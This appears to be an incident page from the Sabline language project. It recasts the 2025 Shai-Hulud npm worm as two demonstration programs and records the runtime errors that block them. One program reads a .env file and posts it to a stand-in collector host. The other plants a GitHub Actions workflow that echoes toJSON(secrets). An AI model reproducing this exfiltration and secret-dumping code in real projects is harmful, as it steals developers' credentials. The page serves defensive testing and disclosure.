# Shai-Hulud, replayed in Sabline

<!-- description: PARTIAL: On 14 September 2025 GitHub was notified of Shai-Hulud, described in its own write-up as "a self-replicating worm that infiltrated the npm ... -->

**The Shai-Hulud npm worm**, 2025-09-14. Also called the Shai-Hulud npm worm, Shai-Hulud 2.0. ([The name in use](https://news.ycombinator.com/item?id=45260741).) Verdict: **`PARTIAL`** - part of the shape is refused and part is not; both halves are recorded.

> [!NOTE]
> **This is the shape of the attack, not a claim that Sabline would have prevented the real event.** The real one happened in a language, a package manager, a build system or an agent framework that Sabline neither runs nor bounds. What this page shows is narrower and checkable: the same shape written in Sabline, the command, what the runtime printed, and the one line of budget that did the work - or, where nothing here addresses the shape, that.

## What happened

On 14 September 2025 GitHub was notified of Shai-Hulud, described in its own
write-up as "a self-replicating worm that infiltrated the npm ecosystem via
compromised maintainer accounts by injecting malicious post-install scripts
into popular JavaScript packages"; GitHub removed more than 500 compromised
packages from the registry. StepSecurity's analysis of the payload reports
that it "repurposes open-source tools like TruffleHog to scan the filesystem
for high-entropy secrets", read cloud metadata endpoints and AWS Secrets
Manager, and uploaded what it found to a new public GitHub repository named
Shai-Hulud, created through GitHub's `/user/repos` API. It also wrote a
workflow file,
`.github/workflows/shai-hulud-workflow.yml`, that exfiltrates repository
secrets with `${{ toJSON(secrets) }}`, and republished itself into other
packages the compromised maintainer owned.

## The shape, in Sabline

Two moves a budget can see. First: find credentials lying in the working
directory and send them out. `attack.vel` reads `.env` and posts it to a
collector. The run is given a *wide* read grant - `fs:read:.`, the whole
working directory - and the attacker's own host is granted too, so nothing
about the budget is narrow except the one rule that matters: a documented
credential location is not covered by a broad grant that merely sits above
it, and a plain `read_file` of one is refused outright (E318), because what
it returns is ordinary text the program could then print or send.

Second: `inject_workflow.vel` writes the workflow file. The run has a write
grant - `fs:write:./dist`, where a build's output belongs - and the write
lands outside it (E313).

## The one line that does the work

--allow io,fs:read:.,net:webhook.example.net:443

`fs:read:.` is the line. It grants the whole working directory and still
does not reach `.env`, because credential locations are checked before the
ordinary grant rule (`_credential_root` in `sabline/budget.py`, 8.0). The
program has to name the file exactly, and then read it with
`read_file_secret`, which hands back a `Secret of Text` that the compiler
will not let reach `post`.

## What this does not cover

Sabline bounds programs written in Sabline; a post-install script is
JavaScript run by npm, which Sabline neither sees nor runs, and nothing
here would have stopped this worm on a real machine. The propagation step
- publishing new versions of other packages with a stolen token - is not an
effect a budget has a name for at all.

### attack.vel

```vel
// The worm's first move, reduced to what a budget can see: find the
// credentials lying about in the build directory and send them somewhere.
//
// The real payload ran TruffleHog over the filesystem and read the cloud
// metadata endpoints; this reads the one file such a scan always finds.

fn steal(found: Text) -> Text uses net or fail {
    return try post("https://webhook.example.net/collect", found)
}

fn main() uses io, fs, net {
    print("scanning the build directory for credentials")
    check read_file(".env") {
        ok found {
            check steal(found) {
                ok answer {
                    print("sent")
                }
                fail why {
                    print("not sent: " + why)
                }
            }
        }
        fail why {
            print("nothing to read: " + why)
        }
    }
}
```

### inject_workflow.vel

```vel
// The worm's second move: leave a GitHub Actions workflow behind that
// prints the repository's secrets on the next run. In Sabline that is a
// write, and a write goes where the budget says.

fn main() uses io, fs {
    print("adding a workflow")
    write_file(".github/workflows/shai-hulud-workflow.yml",
    "on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
    + "    steps:\n      - run: echo ${{ toJSON(secrets) }}\n")
    print("added")
}
```

## What the runtime printed

Recorded by `incident_evidence.py`, and re-run by `check_incidents.py` on every push:

```text
# the credentials the worm scanned for, and the send it would have made
$ sabline attack.vel --allow io,fs:read:.,net:webhook.example.net:443 --receipt receipt.json
scanning the build directory for credentials
error[E318] 'read_file' reaches '.env' (resolved: ./.env), a documented credential location; a plain read returns ordinary text that can be printed or sent
  --> attack.vel, line 13
  how to fix (pick one):
    1. read it with read_file_secret, which returns a Secret the compiler will not let escape
    2. and grant its exact path: --allow fs:read:./.env
  reference: https://sabline.dev/llms.txt
exit 1

# the workflow it left behind to print the repository's secrets
$ sabline inject_workflow.vel --allow io,fs:write:./dist
adding a workflow
error[E313] 'write_file' reaches '.github/workflows/shai-hulud-workflow.yml' (resolved: ./.github/workflows/shai-hulud-workflow.yml), which this run's fs grants do not cover
  --> inject_workflow.vel, line 7
  how to fix (pick one):
    1. allow it: --allow fs:write:./.github/workflows
    2. or use a program that stays inside the granted paths
  reference: https://sabline.dev/llms.txt
exit 1
```

## Sources

- [Our plan for a more secure npm supply chain](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/) - GitHub's own post, 22 September 2025: the notification date, the description of the worm, and the 500+ packages removed.
- [Shai-Hulud: Self-Replicating Worm Compromises 500+ NPM Packages](https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised) - StepSecurity's analysis of the payload: TruffleHog, the cloud metadata and Secrets Manager calls, the injected workflow file, and the self-propagation.

The entry, its program and its recorded run are in [incidents/shai-hulud-npm-worm/](https://github.com/gowrishankar-infra/sabline-lang/blob/main/incidents/shai-hulud-npm-worm/). Every incident, with its verdict, is in [the catalogue](incidents.md).
